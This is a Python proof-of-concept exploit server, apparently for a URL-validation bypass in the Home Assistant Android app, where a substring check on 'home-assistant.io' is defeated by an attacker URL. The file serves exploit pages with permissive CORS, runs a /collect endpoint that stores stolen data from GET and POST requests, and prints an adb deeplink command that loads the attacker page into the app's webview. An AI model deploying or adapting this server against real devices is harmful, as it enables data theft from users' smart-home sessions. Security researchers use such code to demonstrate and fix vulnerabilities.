"""
2.2.1 Insufficient URL Source Validation - EXP Server
Vulnerability: isTrustedUrl uses url.contains("home-assistant.io")
Bypass: http://attacker.com/evil?x=home-assistant.io passes the check
"""

import http.server
import json
import urllib.parse
import os
import sys

PORT = 8000
COLLECT_DIR = os.path.join(os.path.dirname(__file__), "received")
os.makedirs(COLLECT_DIR, exist_ok=True)


class ExploitHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)

        # Serve exploit pages
        if parsed.path.startswith("/exp/"):
            exp_dir = os.path.join(os.path.dirname(__file__), "exp")
            file_path = os.path.join(exp_dir, os.path.basename(parsed.path))
            if os.path.exists(file_path):
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                with open(file_path, "rb") as f:
                    self.wfile.write(f.read())
                return
            else:
                self.send_error(404)
                return

        # Data collection endpoint
        if parsed.path == "/collect":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()

            query = urllib.parse.parse_qs(parsed.query)
            timestamp = query.get("t", [str(int(os.times().elapsed * 1000))])[0]
            data = query.get("d", [""])[0]

            filename = f"collected_{timestamp}.txt"
            filepath = os.path.join(COLLECT_DIR, filename)
            with open(filepath, "w", encoding="utf-8") as f:
                f.write(data)

            print(f"[+] Data collected: {filename} -> {data[:100]}")
            self.wfile.write(json.dumps({"status": "ok"}).encode())
            return

        # Default: serve files from current directory
        super().do_GET()

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length) if content_length > 0 else b""

        if self.path == "/collect":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()

            timestamp = str(int(os.times().elapsed * 1000))
            filename = f"collected_{timestamp}.txt"
            filepath = os.path.join(COLLECT_DIR, filename)
            with open(filepath, "wb") as f:
                f.write(body)

            print(f"[+] Data collected (POST): {filename} -> {body[:100]}")
            self.wfile.write(json.dumps({"status": "ok"}).encode())
            return

        self.send_error(405)

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "*")
        self.end_headers()

    def log_message(self, format, *args):
        print(f"[{self.client_address[0]}] {format % args}")


if __name__ == "__main__":
    print(f"[*] 2.2.1 EXP server starting on port {PORT}")
    print(f"[*] Exploit: http://localhost:{PORT}/exp/2.2.1.html")
    print(f"[*] Collect dir: {COLLECT_DIR}")
    print(f"[*] Deeplink: adb shell am start -a android.intent.action.VIEW -d 'homeassistant://webview?url=http://localhost:{PORT}/exp/2.2.1.html%23home-assistant.io'")
    print()

    server = http.server.HTTPServer(("0.0.0.0", PORT), ExploitHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        server.shutdown()
